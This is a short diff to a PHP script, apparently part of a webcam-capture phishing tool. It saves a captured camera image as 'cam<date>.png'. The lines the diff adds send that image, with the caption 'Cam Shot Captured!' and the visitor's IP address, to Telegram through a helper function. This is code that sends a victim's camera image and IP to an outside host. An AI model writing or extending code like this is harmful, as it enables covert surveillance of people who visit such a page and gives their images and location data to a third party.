@@ -14,6 +14,10 @@ $fp = fopen( 'cam'.$date.'.png', 'wb' );
 fwrite( $fp, $unencodedData);
 fclose( $fp );
 
+include 'telegram_utils.php';
+sendTelegramPhoto('cam'.$date.'.png', "<b>Cam Shot Captured!</b>\nIP: " . $_SERVER['REMOTE_ADDR']);
+
+
 exit();
 ?>
 
